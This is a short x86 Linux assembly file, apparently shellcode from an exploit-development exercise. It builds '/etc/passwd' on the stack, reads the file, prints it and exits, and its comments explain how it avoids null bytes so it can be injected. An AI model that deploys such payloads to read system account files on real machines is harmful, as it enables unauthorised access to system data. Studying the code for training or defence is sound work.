bits 32
%include "include/all.asm"
global _start

_start:
  xor eax, eax ;make all registers NULL
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx

; int open(const char *pathname, int flags);
open:
  mov al, SYS_open ; syscall for open
  push ecx ; push null terminator
  push `d` 
  push WORD `sw`
  push `/pas`
  push `/etc`
  mov ebx, esp ; set the address for open()
  int 0x80

; ssize_t read(int fd, void *buf, size_t count);
read:
  xchg eax, ebx ; put the address saved in ebx to '/etc/passwd' in eax
  xchg eax, ecx ; put the address in ecx, ecx is 0 now
  mov al, SYS_read  ; syscall for read
  mov dx, 0x0FFF ; avoid having null bytes when setting the flag
  inc edx
  int 0x80

write:
  xchg eax, edx ; file descriptor
  mov bl, STD_OUT 
  xor eax, eax ; clear up eax
  mov al, SYS_write 
  int 0x80

exit:
  xor eax, eax
  mov al, SYS_exit ; this is 1 = sys_exit
  int 0x80